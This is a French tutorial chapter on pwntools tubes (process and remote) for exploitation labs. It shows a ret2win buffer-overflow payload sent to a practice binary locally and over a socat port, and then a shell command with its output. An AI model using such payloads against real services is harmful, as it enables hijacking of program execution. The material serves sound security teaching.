# 02 — Tubes : process et remote

[← Module](README.md)

## Objectif

Dialoguer avec un binaire comme le ferait un humain au clavier, mais de façon déterministe :
savoir quand lire, combien lire, et pourquoi une lecture mal placée casse tout ce qui suit.

## Un tube, c'est un tuyau

pwntools appelle « tube » tout objet qui se comporte comme un flux bidirectionnel : `process` pour
un binaire local, `remote` pour une socket TCP, `ssh` pour une session distante. Les méthodes sont
identiques — c'est le point : un exploit écrit sur `process` se rejoue sur `remote` en changeant
une ligne.

```python
io = process("./ret2win")          # local
io = remote("127.0.0.1", 1337)     # réseau
```

## Les méthodes utiles

| Méthode | Effet |
| --- | --- |
| `recv(n)` | lit au plus `n` octets |
| `recvline()` | lit jusqu'au `\n` inclus |
| `recvuntil(b"Entree :")` | lit jusqu'au motif, motif inclus |
| `recvrepeat(t)` | lit tout ce qui arrive pendant `t` secondes |
| `send(data)` | écrit sans ajouter de saut de ligne |
| `sendline(data)` | écrit puis `\n` |
| `sendlineafter(motif, data)` | `recvuntil` puis `sendline` |
| `interactive()` | passe la main au terminal |

`sendlineafter` est la méthode à privilégier : elle supprime les courses entre l'affichage du
programme et l'envoi du payload. Un `send` immédiat après `process()` peut partir avant que le
binaire n'ait lu son entrée, et selon le moment on obtient un résultat différent à chaque essai.

## Lab : dialogue local

```python
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
context.log_level = "error"

io = process("./ret2win")
io.recvuntil(b"Entree :\n")
io.send(b"A" * 72 + p64(elf.symbols["win"]))
io.sendline(b"echo PWNED; id")
print(io.recvall(timeout=3).decode(errors="replace"))
```

```text
Entree :
Bravo, tu as detourne l'execution !
PWNED
uid=10001(openhands) gid=10001(openhands) groups=10001(openhands),27(sudo)
```

Trois détails à noter :

- `recvuntil(b"Entree :\n")` attend le prompt **avant** d'envoyer : pas de course.
- `send` est utilisé pour le payload (binaire, pas de saut de ligne parasite), `sendline` pour la
  commande shell.
- `recvall(timeout=3)` récupère tout jusqu'à la fermeture, avec une limite de temps pour ne pas
  bloquer si le shell reste ouvert.

## Lab : la même chose en réseau

`socat` expose un binaire sur un port, exactement comme un service distant :

```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./ret2win,pty,raw,echo=0
```

```python
io = remote("127.0.0.1", 1337)
io.recvuntil(b"Entree :\n")
io.send(b"A" * 72 + p64(elf.symbols["win"]))
print(io.recvall(timeout=3).decode(errors="replace"))
```

```text
Bravo, tu as detourne l'execution !
```

L'exploit n'a pas changé d'une ligne, seulement la fabrique du tube.

## Quand lire, et combien

Une règle simple : **lire jusqu'au dernier octet connu**, jamais « un peu au hasard ».

- Le programme affiche `Entree :` puis lit : `recvuntil(b"Entree :\n")`.
- Le programme renvoie une adresse sur une ligne : `u64(io.recvline().strip().ljust(8, b"\x00"))`.
- Le programme renvoie un dump sans délimiteur : `recvuntil(b"}")` ou `recv(n)` avec un `n` connu.

`recvline()` sur une adresse n'est sûr que si la ligne contient l'adresse **et rien d'autre**.
Sinon, on décale tout d'un octet et la fuite devient fausse — un classique du chapitre 07.

## Pièges

| Symptôme | Cause |
| --- | --- |
| Résultat différent à chaque exécution | `send` sans attendre le prompt |
| `EOFError` au premier `send` | le binaire a quitté : mauvais offset ou mauvais argument |
| Blocage infini | `recvuntil` attend un motif qui n'arrive jamais ; ajouter `timeout=` |
| Fuite décalée d'un octet | `recvline()` inclut le `\n`, il faut le `strip()` |
| Shell absent alors que « Bravo » s'affiche | `socat` sans `pty` : le shell n'a pas de terminal |

## À retenir

- Un tube = un flux ; `process` et `remote` s'utilisent de la même façon.
- `sendlineafter` plutôt que `send` : la course disparaît.
- On lit jusqu'à un motif connu, pas « environ ».
- `recvall(timeout=…)` évite de bloquer sur un shell resté ouvert.
